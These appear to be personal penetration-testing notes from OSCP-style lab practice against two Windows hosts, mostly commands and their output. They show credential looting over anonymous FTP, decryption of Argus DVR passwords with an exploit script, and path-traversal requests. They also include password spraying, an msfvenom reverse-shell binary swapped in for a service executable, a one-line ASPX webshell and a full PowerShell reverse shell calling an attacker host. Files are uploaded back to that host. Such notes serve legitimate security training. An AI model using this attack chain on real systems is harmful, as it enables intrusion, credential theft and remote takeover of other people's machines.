Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-10 05:40:58

```

```
```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $ftp 192.168.124.111
Connected to 192.168.124.111.
220 Microsoft FTP Service
Name (192.168.124.111:tester): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||51435|)
150 Opening ASCII mode data connection.
02-23-22  08:13AM                  145 .env
02-23-22  08:13AM                 2056 Acq.dll
02-24-22  06:24AM                 4868 DVRParams.ini
02-23-22  08:13AM                35996 Manifest.dll
02-23-22  08:13AM                20455 program.exe
02-23-22  08:15AM                40229 verisign.png
02-23-22  08:14AM                11446 wab.dll
226 Transfer complete.

```

```
ftp> dir
229 Entering Extended Passive Mode (|||51474|)
125 Data connection already open; Transfer starting.
02-23-22  08:13AM                  145 .env
02-23-22  08:13AM                 2056 Acq.dll
02-24-22  06:24AM                 4868 DVRParams.ini
02-23-22  08:13AM                35996 Manifest.dll
02-23-22  08:13AM                20455 program.exe
02-23-22  08:15AM                40229 verisign.png
02-23-22  08:14AM                11446 wab.dll
226 Transfer complete.
ftp> prompt off
Interactive mode off.
ftp> mget *
local: .env remote: .env
229 Entering Extended Passive Mode (|||51479|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************************************************************|   145        0.61 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 8 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
145 bytes received in 00:00 (0.61 KiB/s)
local: Acq.dll remote: Acq.dll
229 Entering Extended Passive Mode (|||51480|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************************************************************|  2056        8.80 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 7 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
2056 bytes received in 00:00 (8.79 KiB/s)
local: DVRParams.ini remote: DVRParams.ini
229 Entering Extended Passive Mode (|||51482|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************************************************************|  4868       20.60 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 201 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
4868 bytes received in 00:00 (20.56 KiB/s)
local: Manifest.dll remote: Manifest.dll
229 Entering Extended Passive Mode (|||51483|)
150 Opening ASCII mode data connection.
 90% |************************************************************************************************************************************************                 | 32664       31.89 KiB/s    00:00 ETAftp: Reading from network: Interrupted system call
  0% |                                                                                                                                                                 |    -1        0.00 KiB/s    --:-- ETA
550 The specified network name is no longer available. 
WARNING! 141 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
local: program.exe remote: program.exe
229 Entering Extended Passive Mode (|||51484|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************************************************************| 20455       43.48 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 83 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
20455 bytes received in 00:00 (43.46 KiB/s)
local: verisign.png remote: verisign.png
229 Entering Extended Passive Mode (|||51486|)
150 Opening ASCII mode data connection.
100% |*****************************************************************************************************************************************************************| 40229       86.46 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 153 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
40229 bytes received in 00:00 (86.41 KiB/s)
local: wab.dll remote: wab.dll
229 Entering Extended Passive Mode (|||51487|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************************************************************| 11446       49.42 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 42 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
11446 bytes received in 00:00 (49.34 KiB/s)

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $cat .env
STATUS = development
DEV_PORT = 7500
PROD_PORT = 7600
HOST = localhost
DATABASE = db.dev
USER = Sandra
PASSWORD = Nj82@1Waqk90$
DIALECT = MSSQL 

```

```
ftp> dir
229 Entering Extended Passive Mode (|||57532|)
150 Opening ASCII mode data connection.
02-23-22  08:13AM                  145 .env
02-23-22  08:13AM                 2056 Acq.dll
02-24-22  06:24AM                 4868 DVRParams.ini
02-23-22  08:13AM                35996 Manifest.dll
02-23-22  08:13AM                20455 program.exe
02-23-22  08:15AM                40229 verisign.png
02-23-22  08:14AM                11446 wab.dll

```

for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n\[\*] Testing $proto ${auth:+(local-auth)}...";  netexec $proto  192.168.124.111 -u Sandra -p  'Nj82@1Waqk90$'  \$auth --continue-on-success ; done; done

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $cat DVRParams.ini 

```

```
MaximumBitrateInKb0=0
AccessFromIPsOnly0=
AccessRestrictedForIPs0=
MaxBytesSent0=0
Password0=6FE0F539CA79E03BECB4D9BDF6413F7EC48C4AC3956BCA79ECB4EB60906BB4A1E1B0F539EB60E03BAAFECA79B734B398
Description0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083
Disabled0=0
ExpirationDate0=0
Organization0=
OrganizationUnit0=

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $python ./CVE-2022-25012/CVE-2022-25012.py  60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083
/home/tester/Desktop/offsec/oscpRealexam/./CVE-2022-25012/CVE-2022-25012.py:48: SyntaxWarning: invalid escape sequence '\_'
  #   /  _  \_______  ____  __ __  ______ #

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############
#                                       #
# Updated by S3L33                      #
#########################################


[+] 60CA:B
[+] AAFE:u
[+] C875:i
[+] 3F7E:l
[+] E03B:t
[+] 3B76:-
[+] C875:i
[+] EB60:n
[+] 7359:+
[+] F641:a
[+] D9BD:c
[+] D9BD:c
[+] 8998:o
[+] AAFE:u
[+] EB60:n
[+] E03B:t
[+] 7359:+
[+] E1D0:f
[+] 8998:o
[+] CA79:r
[+] 7359:+
[+] F641:a
[+] 418D:d
[+] 4D7B:m
[+] C875:i
[+] EB60:n
[+] C875:i
[+] 9083:s
[+] E03B:t
[+] B740:e
[+] CA79:r
[+] C875:i
[+] EB60:n
[+] 3CD9:g
[+] 7359:+
[+] D9BD:c
[+] F641:a
[+] 4D7B:m
[+] B740:e
[+] CA79:r
[+] F641:a
[+] 9083:s

[+] Password: Built-in+account+for+administering+cameras

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpRealexam/CVE-2022-25012]
└──╼ $python CVE-2022-25012.py  6FE0F539CA79E03BECB4D9BDF6413F7EC48C4AC3956BCA79ECB4EB60906BB4A1E1B0F539EB60E03BAAFECA79B734B398
/home/tester/Desktop/offsec/oscpRealexam/CVE-2022-25012/CVE-2022-25012.py:48: SyntaxWarning: invalid escape sequence '\_'
  #   /  _  \_______  ____  __ __  ______ #

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############
#                                       #
# Updated by S3L33                      #
#########################################


[+] 6FE0:V
[+] F539:3
[+] CA79:r
[+] E03B:t
[+] ECB4:1
[+] D9BD:c
[+] F641:a
[+] 3F7E:l
[+] C48C:8
[+] 4AC3:S
[+] 956B:h
[+] CA79:r
[+] ECB4:1
[+] EB60:n
[+] 906B:k
[+] B4A1:2
[+] E1B0:C
[+] F539:3
[+] EB60:n
[+] E03B:t
[+] AAFE:u
[+] CA79:r
[+] B734:y
[+] B398:!

[+] Password: V3rt1cal8Shr1nk2C3ntury!

```

admin:V3rt1cal8Shr1nk2C3ntury!

```
for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}...";  netexec $proto  192.168.124.111 -u admin -p  'V3rt1cal8Shr1nk2C3ntury!'  $auth --continue-on-success ; done; done
```

```
┌─[tester@parrot]─[~/Desktop/VPN]
└──╼ $curl "http://192.168.124.111:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

[drivers]
wave=mmdrv.dll
timer=timer.drv

[mci]

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/VPN]
└──╼ $curl "http://192.168.124.111:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2FDrivers%2Fetc%2Fhosts&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost


```

### loop

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}..."; netexec $proto 192.168.124.111 -u user_web  -p pass_web $auth --continue-on-success; done; done

[*] Testing smb ...
SMB         192.168.124.111 445    OSCP             [*] Windows 10 / Server 2019 Build 19041 x64 (name:OSCP) (domain:OSCP) (signing:False) (SMBv1:None)
SMB         192.168.124.111 445    OSCP             [-] OSCP\Sandra:Nj82@1Waqk90$ STATUS_LOGON_FAILURE 
SMB         192.168.124.111 445    OSCP             [-] OSCP\admin:Nj82@1Waqk90$ STATUS_LOGON_FAILURE 
SMB         192.168.124.111 445    OSCP             [+] OSCP\Sandra:V3rt1cal8Shr1nk2C3ntury! 
SMB         192.168.124.111 445    OSCP             [-] OSCP\admin:V3rt1cal8Shr1nk2C3ntury! STATUS_LOGON_FAILURE 

[*] Testing smb (local-auth)...
SMB         192.168.124.111 445    OSCP             [*] Windows 10 / Server 2019 Build 19041 x64 (name:OSCP) (domain:OSCP) (signing:False) (SMBv1:None)
SMB         192.168.124.111 445    OSCP             [-] OSCP\Sandra:Nj82@1Waqk90$ STATUS_LOGON_FAILURE 
SMB         192.168.124.111 445    OSCP             [-] OSCP\admin:Nj82@1Waqk90$ STATUS_LOGON_FAILURE 
SMB         192.168.124.111 445    OSCP             [+] OSCP\Sandra:V3rt1cal8Shr1nk2C3ntury! 
SMB         192.168.124.111 445    OSCP             [-] OSCP\admin:V3rt1cal8Shr1nk2C3ntury! STATUS_LOGON_FAILURE 

[*] Testing winrm ...
WINRM       192.168.124.111 5985   OSCP             [*] Windows 10 / Server 2019 Build 19041 (name:OSCP) (domain:OSCP) 
WINRM       192.168.124.111 5985   OSCP             [-] OSCP\Sandra:Nj82@1Waqk90$
WINRM       192.168.124.111 5985   OSCP             [-] OSCP\admin:Nj82@1Waqk90$
WINRM       192.168.124.111 5985   OSCP             [+] OSCP\Sandra:V3rt1cal8Shr1nk2C3ntury! (Pwn3d!)
WINRM       192.168.124.111 5985   OSCP             [-] OSCP\admin:V3rt1cal8Shr1nk2C3ntury!

[*] Testing winrm (local-auth)...
WINRM       192.168.124.111 5985   OSCP             [*] Windows 10 / Server 2019 Build 19041 (name:OSCP) (domain:OSCP) 
WINRM       192.168.124.111 5985   OSCP             [-] OSCP\Sandra:Nj82@1Waqk90$
WINRM       192.168.124.111 5985   OSCP             [-] OSCP\admin:Nj82@1Waqk90$
WINRM       192.168.124.111 5985   OSCP             [+] OSCP\Sandra:V3rt1cal8Shr1nk2C3ntury! (Pwn3d!)
WINRM       192.168.124.111 5985   OSCP             [-] OSCP\admin:V3rt1cal8Shr1nk2C3ntury!

[*] Testing wmi ...
RPC         192.168.124.111 135    OSCP             [*] Windows 10 / Server 2019 Build 19041 (name:OSCP) (domain:OSCP)
RPC         192.168.124.111 135    OSCP             [-] OSCP\Sandra:Nj82@1Waqk90$ (RPC_S_ACCESS_DENIED)
RPC         192.168.124.111 135    OSCP             [-] OSCP\admin:Nj82@1Waqk90$ (RPC_S_ACCESS_DENIED)
RPC         192.168.124.111 135    OSCP             [+] OSCP\Sandra:V3rt1cal8Shr1nk2C3ntury! 
RPC         192.168.124.111 135    OSCP             [-] OSCP\admin:V3rt1cal8Shr1nk2C3ntury! (RPC_S_ACCESS_DENIED)

[*] Testing wmi (local-auth)...
RPC         192.168.124.111 135    OSCP             [*] Windows 10 / Server 2019 Build 19041 (name:OSCP) (domain:OSCP)
RPC         192.168.124.111 135    OSCP             [-] OSCP\Sandra:Nj82@1Waqk90$ (RPC_S_ACCESS_DENIED)
RPC         192.168.124.111 135    OSCP             [-] OSCP\admin:Nj82@1Waqk90$ (RPC_S_ACCESS_DENIED)
RPC         192.168.124.111 135    OSCP             [+] OSCP\Sandra:V3rt1cal8Shr1nk2C3ntury! 
RPC         192.168.124.111 135    OSCP             [-] OSCP\admin:V3rt1cal8Shr1nk2C3ntury! (RPC_S_ACCESS_DENIED)

[*] Testing rdp ...

```

### evil-winrm

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $evil-winrm-py -i 192.168.124.111   -u Sandra   -p "V3rt1cal8Shr1nk2C3ntury!"
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to '192.168.124.111:5985' as 'Sandra'
evil-winrm-py PS C:\Users\Sandra\Documents>

```

### 192.168.124.111 admin

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.124 LPORT=4444 -f exe -o DVRWatchdog.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: DVRWatchdog.exe

```

```
evil-winrm-py PS C:\Users\Sandra\Documents> move "C:\Program Files\Argus Surveillance DVR\DVRWatchdog.exe" "C:\Program Files\Argu
s Surveillance DVR\DVRWatchdog.exe.bak"
evil-winrm-py PS C:\Users\Sandra\Documents> upload DVRWatchdog.exe "C:\Program Files\Argus Surveillance DVR\DVRWatchdog.exe"
Uploading /home/tester/Desktop/offsec/oscpRealexam/DVRWatchdog.exe: 100%|███████████████████| 7.50k/7.50k [00:00<00:00, 9.54kB/s]
[+] File uploaded successfully as: C:\Program Files\Argus Surveillance DVR\DVRWatchdog.exe

```

```
evil-winrm-py PS C:\Users\Sandra\Documents> shutdown /r /t 0
[-] Failed to connect to the remote host: 192.168.124.111:5985
[ble: exit 1]

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $sudo rlwrap nc -nlvp 4444
[sudo] password for tester: 
Listening on 0.0.0.0 4444
Connection received on 192.168.124.111 49668
Microsoft Windows [Version 10.0.19042.1526]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>


```

# Recon 192.168.124.112

### \[\[PORT & IP SCAN]]

summary the openport only with One-Paragraph -- AI

```
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 127
5985/tcp open  wsman   syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 44.41 seconds
           Raw packets sent: 131100 (5.768MB) | Rcvd: 30 (1.304KB)
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-09 22:13 HKT
Nmap scan report for 192.168.124.112
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Almond Blossoms AI
| http-methods: 
|_  Potentially risky methods: TRACE
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.16 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-09 22:13 HKT
Nmap scan report for 192.168.124.112
Host is up (0.23s latency).
All 100 scanned ports on 192.168.124.112 are in ignored states.
Not shown: 100 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 2.65 seconds

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $cat << 'EOF' > users112.txt
linda.hargreaves
marcus.webb
neville.grant
tayla.chen
terry.walsh
victor.osei
EOF

```

### subdomain

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $cat /etc/hosts
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
10.129.244.79   browsedinternals.htb
10.10.135.148     MS02.oscp.exam MS02

172.16.124.200     DC20.oscp.exam oscp.exam DC20
192.168.124.112     almondblossoms.ai

10.129.232.158 mail.outbound.htb outbound.htb
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others

```

```
─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ  -u http://192.168.124.112 -H 'Host: FUZZ.almondblossoms.ai' -ac 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.124.112
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.almondblossoms.ai
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

support                 [Status: 200, Size: 2645, Words: 458, Lines: 46, Duration: 628ms]
blog                    [Status: 200, Size: 24017, Words: 4639, Lines: 518, Duration: 966ms]
jobs                    [Status: 200, Size: 20841, Words: 4106, Lines: 489, Duration: 938ms]
```

### support.almondblossoms.ai

![Pasted image 20260710145348.png](/ob/Pasted%20image%2020260710145348.png)

![Pasted image 20260710145331.png](/ob/Pasted%20image%2020260710145331.png)

![Pasted image 20260710145418.png](/ob/Pasted%20image%2020260710145418.png)

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $echo '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>' > shell.aspx.jpg
```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Antak-WebShell/antak.aspx
--2026-07-10 16:25:50--  https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Antak-WebShell/antak.aspx
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10444 (10K) [text/plain]
Saving to: ‘antak.aspx’

antak.aspx                                          100%[=================================================================================================================>]  10.20K  --.-KB/s    in 0.001s  

2026-07-10 16:25:51 (9.45 MB/s) - ‘antak.aspx’ saved [10444/10444]

```

![Pasted image 20260710162840.png](/ob/Pasted%20image%2020260710162840.png)

![Pasted image 20260710162900.png](/ob/Pasted%20image%2020260710162900.png)

![Pasted image 20260710162917.png](/ob/Pasted%20image%2020260710162917.png)

![Pasted image 20260710162929.png](/ob/Pasted%20image%2020260710162929.png)

```
PS> type   C:\Users\marcus\Desktop\local.txt  


PS> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.124.112
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.124.254

```

### Shell

```
$LHOST = "192.168.49.124"; $LPORT = 443; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $sudo rlwrap nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 192.168.124.112 51113


whoami 
oscp\marcus

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $python -m uploadserver 
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.124.112 - - [10/Jul/2026 17:25:37] "GET /PrivescCheck.ps1 HTTP/1.1" 200 -
```

```
curl http://192.168.49.124:8000/PrivescCheck.ps1 -o PrivescCheck.ps1
```

```autohotkey
curl.exe -X POST http://192.168.49.124:8000/upload -F "files=@PrivescCheck_OSCP.html"
```

```
192.168.124.112 - - [10/Jul/2026 17:42:36] [Uploaded] "PrivescCheck_OSCP.html" --> /home/tester/Desktop/offsec/oscpRealexam/PrivescCheck_OSCP.html
192.168.124.112 - - [10/Jul/2026 17:42:36] "POST /upload HTTP/1.1" 204 
```

```
curl http://192.168.49.124:8000/winPEASx64.exe -o winPEASx64.exe
```

```
./winPEASx64.exe > output.txt
```

```
curl.exe -X POST http://192.168.49.124:8000/upload -F "files=@output.txt"
```
